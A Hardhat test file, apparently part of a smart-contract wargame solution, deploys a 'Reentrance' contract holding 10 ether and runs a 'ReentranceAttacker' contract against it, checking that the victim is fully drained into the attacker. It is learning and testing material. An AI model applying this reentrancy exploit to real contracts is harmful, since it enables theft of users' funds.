import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"

const CONTRACT_NAME = "Reentrance"
const CONTRACT_NAME_ATTACKER = "ReentranceAttacker"

describe(CONTRACT_NAME, () => {
    let owner: SignerWithAddress
    let attacker: SignerWithAddress
    let reentrance: Contract
    let reentranceAttacker: Contract
    let tx: TransactionResponse

    it("Should be possible to steal all the funds from the contract", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        const Reentrance = await ethers.getContractFactory(CONTRACT_NAME)
        reentrance = await Reentrance.deploy()
        await reentrance.deployed()

        tx = await owner.sendTransaction({
            to: reentrance.address,
            value: ethers.utils.parseEther("10")
        })
        await tx.wait()

        expect(await ethers.provider.getBalance(reentrance.address)).to.eq(ethers.utils.parseEther("10"))

        const ReentranceAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
        reentranceAttacker = await ReentranceAttacker.connect(attacker).deploy(reentrance.address)
        await reentranceAttacker.deployed()

        expect(await ethers.provider.getBalance(reentranceAttacker.address)).to.eq(0)

        const donation = ethers.utils.parseEther("1")
        tx = await reentranceAttacker.connect(attacker).attack( { value: donation } )
        await tx.wait()

        expect(await ethers.provider.getBalance(reentrance.address)).to.eq(ethers.utils.parseEther("0"))
        expect(await ethers.provider.getBalance(reentranceAttacker.address)).to.eq(ethers.utils.parseEther("11"))
    })
})